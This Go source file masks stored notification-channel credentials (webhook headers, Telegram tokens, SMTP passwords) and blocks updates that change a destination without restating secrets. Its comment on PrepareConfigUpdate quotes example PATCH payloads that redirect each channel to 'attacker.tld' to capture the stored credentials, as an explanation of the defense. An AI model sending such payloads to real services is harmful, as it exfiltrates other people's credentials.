// [한국어 파일 안내] notify/mask.go
// 채널 설정을 브라우저에 보여 줄 때 비밀 값을 마스킹하고 PATCH 시의 유지·교체·삭제 의미를 관리한다.
// __masked__ 값은 실제 토큰이 아니라 기존 저장값을 유지하라는 센티널이다. 빈 문자열은 명시적 삭제다.
// 대상 URL/SMTP 호스트 등 자격 증명을 받는 위치가 바뀌면 이전 토큰을 그대로 보내지 않도록 각 비밀 필드의 새 값을 요구한다.
// 마스킹은 API 표시 보호이며 DB 암호화를 수행하는 것은 아니다.
package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix 是掩码值的标记前缀。API 回显凭据时用带此前缀的值替换真实内容，
// 更新接口收到带此前缀的值即理解为「保持库中原值不变」。
//
// 用前缀而不是空串或某个固定常量，是为了能顺带带上一点可辨识信息
// （见 MaskedValue），让用户区分得出「这是哪个机器人」而不必重新粘贴密钥。
const MaskedPrefix = "__masked__"

// MaskedValue 生成一个掩码值：
//
//	"__masked__"              原值太短，不给任何提示
//	"__masked__:…ab12cd"      带上原值末 6 位作为辨识提示
//
// 只暴露末 6 位是刻意选择的：Webhook 地址的辨识信息在末段（如企业微信的 key、
// 飞书的机器人 id），而前缀部分各机器人相同、没有辨识价值。末 6 位不足以
// 还原凭据，但足以让配置者认出「是我那个群」。
// 한국어 해설: 짧은 비밀은 전부 감추고 긴 비밀은 마지막 6바이트 힌트만 붙여 어느 설정인지 식별하게 한다.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked 报告某个值是否为掩码值（即接口回显后未被修改）。
// 한국어 해설: 지정 접두어가 있으면 브라우저가 그대로 돌려준 미수정 비밀 값으로 판별한다.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig 返回配置的副本，把该渠道的凭据字段替换成掩码值。
//
// 未知渠道类型返回空 map 而不是原配置——宁可让 UI 显示「配置不可用」，
// 也不要在渠道类型无法识别时把可能含凭据的原始内容整个吐回去。
// 非凭据字段原样保留，UI 才能正常展示。
// 한국어 해설: 설정의 복사본에서 해당 채널이 선언한 비밀 필드만 마스킹한다. 채널 종류를 모르면 원문 유출 대신 빈 map을 반환한다.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers 这类嵌套结构整体按一个凭据处理：逐个子键判断需要每个渠道
		// 再声明一套「哪些子键是凭据」的规则，复杂度远超收益。
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials 表示「目标地址变了，但调用方没有对
// 凭据字段表态」。返回它而不是默默放行或默默丢弃凭据，理由见 PrepareConfigUpdate。
// 한국어 자료형: 대상은 바꾸었지만 비밀 값을 새로 명시하지 않은 설정 갱신을 호출자가 구분할 수 있는 오류 타입이다.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 发生变化的目的地键
	Missing []string // 未显式表态的凭据键
}

// 한국어 해설: 바뀐 대상 키와 다시 명시해야 하는 비밀 키를 설명한다. 실제 저장된 자격 증명 값은 메시지에 넣지 않는다.
func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "目标地址（" + strings.Join(e.Changed, "、") + "）已变更，请同时重新填写凭据字段（" +
		strings.Join(e.Missing, "、") + "）：填入新值，或显式留空表示不再需要凭据。" +
		"原凭据只对旧地址有效，继续沿用等于把它交给新地址。"
}

// PrepareConfigUpdate 合并渠道配置，并处理「目标地址变更」这一安全敏感情况。
//
// 它替代裸的 MergeConfig 用在渠道更新路径上，解决的是这样一条实测可行的路径：
// 目标地址（消息发往哪）与凭据（用什么身份发）是两套独立字段，而 MergeConfig
// 对「未提及的键」一律保留库中原值。于是任何能 PATCH 渠道的人只要**只改地址、
// 对凭据避而不谈**，就能让服务器把库里的真凭据发到自己控制的端点：
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 原始 Authorization 头随请求外发
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<真Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 后交出用户名与密码
//
// 这条路径完全静默、不依赖重定向（所以拒绝跨主机跳转挡不住它），
// 而且直接击穿了本包掩码机制的目标——「凭据不回显给浏览器」。
//
// 规则：只要某个目的地键被改成新值，调用方就必须对**每一个**凭据键显式表态：
//   - 给出新值 → 用新值
//   - 显式传空串 → 该字段不再需要凭据（保留清空语义）
//   - 原样回传掩码值 / 干脆不提这个键 → 拒绝
//
// 第三种之所以也拒绝，是因为「掩码值」的含义正是「沿用旧凭据」，而旧凭据
// 只对旧地址有效。这里刻意不做「自动丢弃凭据」——那对可选凭据字段
// （webhook 的 headers、email 的 password）会静默变成「鉴权没了但接口返回 200」，
// 比报错更难排查。宁可让操作者多填一次。
// 한국어 해설: 중첩 마스크 오용을 먼저 거절하고 대상 값 변화를 비교한 뒤 안전한 부분 갱신을 구성한다.
// 대상이 바뀌면 비밀 필드 누락/마스킹 유지 값을 거절하고 명시적 새 값 또는 빈 값만 받아들인다.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("渠道类型 %q 未注册", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 非字符串的凭据值（如 webhook 的 headers 是个对象）里若嵌着掩码字面量，
	// 说明调用方把「保持原值」的哨兵塞进了结构体内部。MergeConfig 只认「字符串
	// 且带前缀」为掩码，这种形态会被当普通对象原样存下去——库里真的落下字面量
	// "__masked__"，后续鉴权静默失效且没有任何报错。宁可拒掉。
	//
	// 这个检查必须放在**最前面**：地址没变时会走提前返回，放在后面就等于
	// 只覆盖了「改地址」这一条路径（第一版就是这么放错的，测试直接抓到了）。
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 找出真正被改掉的目的地键。掩码值等于「没改」。
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 地址没变，走普通合并（掩码值保留原值、空串清空、其余覆盖）。
		return MergeConfig(stored, incoming), nil
	}

	// 地址变了：要求对每个凭据键显式表态。
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers 拒绝把掩码哨兵嵌在非字符串结构里提交。
//
// 掩码机制的前提是「整个值就是个字符串」。像 webhook 的 headers 这种对象字段，
// 只能整体掩码（写成字符串 "__masked__"）或整体提交；把哨兵塞进对象内部
// 既表达不了「保持不变」，又会被当成真实值存进库。
// 한국어 해설: headers 객체 내부에 __masked__를 실제 값처럼 넣는 잘못된 제출을 거절한다. 객체 전체 마스크와 실제 새 객체만 구분한다.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("字段 %s 的内容里含掩码标记 %q：该字段只能整体留空表示沿用、或整体提交新值，不能在结构体内部夹带掩码占位",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue 比较两个配置值是否等价。用 JSON 序列化比较是为了顺带处理
// 类型差异——前端提交的端口是 number，而库里读回来的是 float64，直接 == 会误判。
//
// 「空」必须先归一化再比较：空串与「键不存在」在这个配置模型里是同一个状态，
// 因为 MergeConfig 把空串当显式清空、直接 delete 掉该键。不归一化的话，一个
// 始终留空的可选目的地字段（Telegram 的 base_url 是唯一这样的字段：留空即用
// 官方地址）会走成这条路径——
//
//	新建时存下 base_url:""  →  第一次保存被 MergeConfig 删键
//	→ 第二次保存时 incoming 是 ""、stored 缺键，被判成「地址变了」
//	→ 凭据是掩码值 → 400「目标地址已变更，请同时重新填写凭据字段」
//
// 此后每次保存都失败，除非用户重新粘贴一遍 Bot Token，而他什么都没改。
// 한국어 해설: 빈 값/누락을 같은 상태로 본 뒤 JSON 표현을 비교하여 int/float64 타입 차이로 가짜 대상 변경을 판단하지 않게 한다.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue 判定一个配置值是否为「空」。
// 口径必须与 MergeConfig 的清空判定一致（strings.TrimSpace(s) == ""），
// 否则会出现「MergeConfig 认为该删、sameConfigValue 认为有值」的夹缝。
// 한국어 해설: MergeConfig의 삭제 규칙과 같은 기준으로 nil·공백 문자열을 빈 설정으로 판별한다.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig 把 incoming 合并到 stored 之上，用于更新渠道配置。
//
// 规则：
//   - incoming 里值为掩码的键 → 保留 stored 的原值（用户没改这个字段）
//   - incoming 里值为空串的键 → 视为显式清空，删除该键
//   - 其余键 → 用 incoming 的值覆盖
//   - stored 里有而 incoming 里没有的键 → 保留（局部更新语义）
//
// 空串是否算「清空」需要明确：前端表单把未填的字段提交为空串，
// 若把它当成有效值写入，会把「留空以保留原值」的字段真的清掉。
// 这里选择显式清空，因为要清除一个设错的字段时，用户没有别的表达方式
// （拖走字段可区分「未提供」与「提供空值」，但 UI 用不到这个区别）。
// 한국어 해설: 미제공 키와 마스크 값은 유지하고 빈 문자열은 삭제하며 나머지 값은 교체한다. 대상 변경 보호가 필요한 API는 PrepareConfigUpdate를 먼저 쓴다.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 掩码值 = 未修改，保留 stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
